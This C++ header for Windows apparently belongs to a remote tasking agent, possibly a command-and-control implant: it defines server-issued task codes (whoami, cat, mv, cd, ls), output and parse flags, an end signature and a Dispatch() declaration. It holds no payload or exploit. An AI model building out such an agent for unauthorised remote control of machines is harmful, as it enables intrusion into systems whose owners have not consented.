#pragma once
#include <windows.h>


#define TASK_FAILED 5
#define OUTPUT_RAW  4
#define OUTPUT_NEEDS_PARSE 3

#define PARSE_WHOAMI 0xac
#define PARSE_LS     0xab

#define END_SIG ((INT32)0xDEADBEEF)

// server holds success code -> string mappings
#define MV_SUCCESS  6


enum TaskCodes : INT32 {
	PAD,
	TASK_WHOAMI,
	TASK_CAT,
	TASK_MV,
	TASK_CD,
	TASK_LS,
};

BOOL Dispatch();
